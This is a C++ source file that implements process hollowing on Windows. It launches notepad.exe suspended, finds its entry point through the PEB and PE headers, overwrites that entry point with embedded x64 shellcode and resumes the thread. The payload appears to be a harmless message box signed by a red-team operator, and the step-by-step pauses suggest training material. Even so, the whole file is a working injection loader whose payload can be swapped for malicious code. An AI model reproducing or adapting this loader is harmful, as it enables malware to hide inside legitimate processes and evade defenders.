#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <cstring>

const char* k = "[+]";
const char* e = "[-]";

DWORD PID = NULL;
HANDLE hProcess = NULL;

unsigned char shellcode[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
};

// Define types not in standard headers
typedef NTSTATUS(WINAPI* _ZwQueryInformationProcess)(
    HANDLE,
    PROCESSINFOCLASS,
    PVOID,
    ULONG,
    PULONG
    );

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Start the Notepad process
    int status = CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"),
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi);

    if (!status) {
        printf("%s failed open process, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    hProcess = pi.hProcess;
    PID = pi.dwProcessId;
    printf("%s PID %ld\n", k, PID);
    system("pause");

    // Get ZwQueryInformationProcess from ntdll.dll
    _ZwQueryInformationProcess ZwQueryInformationProcess =
        (_ZwQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwQueryInformationProcess");

    if (!ZwQueryInformationProcess) {
        printf("%s Failed to get ZwQueryInformationProcess", e);
        return EXIT_FAILURE;
    }

    // Get PEB address
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    ZwQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);

    // We read the Image Base Address from the PEB
    // In 64 bit architecture the offset for the Image Base Address is 16 bytes. 0x10
    PVOID pebAddress = pbi.PebBaseAddress;
    PVOID imageBaseAddress = nullptr;
    SIZE_T bytesRead;
    ReadProcessMemory(hProcess, (PBYTE)pebAddress + 0x10, &imageBaseAddress, sizeof(PVOID), &bytesRead);
    printf("%s Image Base Address: \\---0x%p\n", k, imageBaseAddress);

    // Read NE header to find Entry Point RVA
    // We create a 512 Bytes buffer to store the Headers of the executable
    BYTE buffer[0x200];
    ReadProcessMemory(hProcess, imageBaseAddress, buffer, sizeof(buffer), &bytesRead);

    // e_lfanew contains the address where the NE header beggins
    // It is at offset 0x3C (60 bytes) from the DOS Header
    // The Relative Virtual Address of the Entry Point is at offset 0x28 (40 bytes)
    DWORD e_lfanew = *(DWORD*)(buffer + 0x3C);
    DWORD entryPointRVA = *(DWORD*)(buffer + e_lfanew + 0x28);
    printf("%s Entry Point RVA: \\---0x%p\n", k, entryPointRVA);

    // We add the Image Base Address with the RVA of the Entry Point to get the real address
    PVOID entryPointAddress = (PBYTE)imageBaseAddress + entryPointRVA;

    printf("%s Entry Point Address: \\---0x%p\n", k, entryPointAddress);
    system("pause");

    // Optional
    // Create an array filled with zeros of the same size of the shellcode
    size_t size = sizeof(shellcode) / sizeof(shellcode[0]);
    unsigned char zeroArray[sizeof(shellcode)];
    std::memset(zeroArray, 0, size);

    // We use the Zero Array to demonstrate the Hollowing of the process
    SIZE_T bytesWritten;
    WriteProcessMemory(hProcess, entryPointAddress, zeroArray, sizeof(zeroArray), &bytesWritten);
    printf("%s The process Has been hollowed, filled with zeros\n", k);
    system("pause");

    // Now we write the shellcode at the Entry Point address of the process
    WriteProcessMemory(hProcess, entryPointAddress, shellcode, sizeof(shellcode), &bytesWritten);

    printf("%s Shellcode written on the Entry Point Address\n", k);
    system("pause");

    // Resume the suspended thread, executing the hollowed process
    ResumeThread(pi.hThread);

    printf("%s Process injection concluded! Press enter to exit\n", k);
    getchar();

    return EXIT_SUCCESS;
}
